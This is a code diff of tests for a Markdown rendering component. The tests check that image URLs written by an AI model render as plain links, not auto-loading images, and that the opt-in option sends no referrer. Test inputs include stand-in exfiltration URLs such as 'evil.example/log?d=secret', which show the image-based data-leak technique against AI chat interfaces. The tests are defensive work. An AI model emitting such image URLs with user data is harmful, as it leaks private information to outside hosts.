@@ -56,7 +56,25 @@ test("markdown SSR: string child + streaming repair and caret", async () => {
   assert.equal(streaming.match(/markdown__caret/g)?.length, 1);
 });
 
-test("markdown SSR: images send no referrer (untrusted model output must not leak the page URL to image hosts)", async () => {
-  const html = await renderToString(() => <Markdown content={"![chart](https://img.example.com/c.png)"} />);
+test("markdown SSR: remote images stay links by default (a model-written URL must not fetch without a click)", async () => {
+  for (const src of ["https://evil.example/log?d=secret", "//evil.example/log?d=secret"]) {
+    const html = await renderToString(() => <Markdown content={`![chart](${src})`} />);
+    assert.doesNotMatch(html, /<img/i, src);
+    assert.match(html, /<a [^>]*>chart<\/a>/i, src);
+  }
+  const noAlt = await renderToString(() => <Markdown content={"![](https://evil.example/x.png)"} />);
+  assert.match(noAlt, /<a [^>]*>https:\/\/evil\.example\/x\.png<\/a>/i);
+});
+
+test("markdown SSR: relative images load; remoteImages loads remote ones, with no referrer", async () => {
+  assert.match(await renderToString(() => <Markdown content={"![a](/img/a.png)"} />), /<img [^>]*src="\/img\/a\.png"/i);
+  const html = await renderToString(() => <Markdown remoteImages content={"![chart](https://img.example.com/c.png)"} />);
   assert.match(html, /<img [^>]*src="https:\/\/img.example.com\/c.png"[^>]*referrerpolicy="no-referrer"/i);
+});
+
+test("markdown SSR: remoteImages on one instance does not unlock a shared components map elsewhere", async () => {
+  const components = { p: (props: { children?: unknown }) => <p>{props.children as string}</p> };
+  await renderToString(() => <Markdown remoteImages components={components} content={"text"} />);
+  const html = await renderToString(() => <Markdown components={components} content={"![c](https://evil.example/x.png)"} />);
+  assert.doesNotMatch(html, /<img/i);
 });
